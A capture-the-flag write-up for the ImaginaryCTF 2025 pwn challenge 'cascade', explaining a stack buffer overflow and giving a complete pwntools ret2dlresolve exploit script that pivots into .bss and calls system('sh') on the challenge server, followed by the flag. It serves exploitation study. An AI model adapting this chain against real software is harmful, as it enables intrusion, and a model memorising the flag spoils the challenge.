---
title: "cascade"
description: "Stack overflow into ret2dlresolve — force the dynamic linker to resolve system at runtime and run system(\"sh\")."
event: "ImaginaryCTF 2025"
year: 2025
category: pwn
tags: ["stack-overflow", "ret2dlresolve", "rop", "pwntools"]
difficulty: medium
date: "2025-07-05"
sourceRepo: "R3izorr/CTF_writeup"
sourcePath: "ImaginaryCTF_2025/Pwn/cascade"
featured: true
flagsHidden: false
---

> Category: Pwn · Difficulty: Medium · Author: c-bass
>
> *"just a buffer overflow, right?"*

## The bug

A stripped 64-bit ELF. `main` just disables stdio buffering and calls `vuln()`:

```c
void vuln(void) {
    char local_48[64];
    read(0, local_48, 0x200);   // classic overflow
}
```

64 bytes of buffer, 0x200 bytes read. Full RIP control.

## Why ret2dlresolve

- No `system@plt`.
- There is a `setvbuf@plt`, which means the linker already knows how to resolve symbols for this object.
- Partial RELRO lets us place crafted resolver data in `.bss`.

That is the textbook `Ret2dlresolvePayload` pattern.

## Plan

1. Overflow and pivot into `.bss` so there's room for a long fake frame.
2. Build `Ret2dlresolvePayload(symbol='system', args=[], ...)` via pwntools.
3. Trigger the resolver by chaining through the existing `setvbuf@plt` stub.
4. Put `sh\0` somewhere reachable, call `system("sh")`.

## Solve

```python
from pwn import *

context.binary = elf = ELF("./vuln")
conn = remote("cascade.chal.imaginaryctf.org", 1337)

dlresolve = Ret2dlresolvePayload(
    elf,
    symbol='system',
    args=[],
    data_addr=0x404070,
    resolution_addr=elf.got.setvbuf,
)

# Stage 1: pivot stack into .bss
conn.sendline(
    (b"A" * 64 + p64(elf.sym.stdout + 0x40) + p64(0x401162))
    .ljust(0x200 - 1, b"\0")
)

# Stage 2: fake dlresolve structures + "sh"
rop = ROP(elf)
rop.ret2dlresolve(dlresolve)
rop.raw(rop.ret)
rop.main()

conn.sendline(
    (p64(elf.sym.stdout + 8) + b"sh\0\0\0\0\0\0"
     + b"A" * 0x30 + p64(0x404f40) + p64(0x401162)
     + dlresolve.payload).ljust(0x200 - 1, b"\0")
)

# Stage 3: final chain that calls system("sh")
conn.sendline(
    (b"A" * 0x48 + rop.chain() + dlresolve.payload)
    .ljust(0x200 - 1, b"\0")
)

conn.interactive()
```

## Flag

```text
ictf{i_h0pe_y0u_didnt_use_ret2dl_94b51175}
```
